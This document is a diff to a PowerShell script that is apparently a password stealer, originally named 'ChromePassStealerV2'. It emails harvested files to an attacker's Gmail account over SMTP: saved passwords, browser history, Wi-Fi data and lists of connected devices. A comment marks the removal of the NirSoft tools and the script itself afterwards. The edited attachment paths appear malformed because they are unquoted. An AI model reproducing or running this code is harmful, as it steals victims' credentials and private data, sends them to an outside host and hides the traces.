@@ -15,12 +15,12 @@ $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('nomorepyro@gmai
 $ReportEmail = New-Object System.Net.Mail.MailMessage
 $ReportEmail.From = 'nomorepyro@gmail.com' #Email in which you want to receice the information
 $ReportEmail.To.Add('nomorepyro@gmail.com') #Email in which you want to receive the information
-$ReportEmail.Subject = 'ChromePassStealerV2'
+$ReportEmail.Subject = 'Get any passwords'
 $ReportEmail.Body = 'Attached is your list of informations.'
-$ReportEmail.Attachments.Add('C:\Users\Public\Documents\passwords.txt')
-$ReportEmail.Attachments.Add('C:\Users\Public\Documents\history.txt')
-$ReportEmail.Attachments.Add('C:\Users\Public\Documents\wifi.txt')
-$ReportEmail.Attachments.Add('C:\Users\Public\Documents\connected_devices.txt')
+$ReportEmail.Attachments.Add($env:systemdrive\users\$env:username\Documents\passwords.txt)
+$ReportEmail.Attachments.Add($env:systemdrive\users\$env:username\Documents\history.txt)
+$ReportEmail.Attachments.Add($env:systemdrive\users\$env:username\Documents\wifi.txt)
+$ReportEmail.Attachments.Add($env:systemdrive\users\$env:username\Documents\connected_devices.txt)
 $SMTPInfo.Send($ReportEmail) #Send mail
 Start-Sleep -Seconds 15 #Wait 15 seconds
 #Delete nirsoft tools and .ps1 file
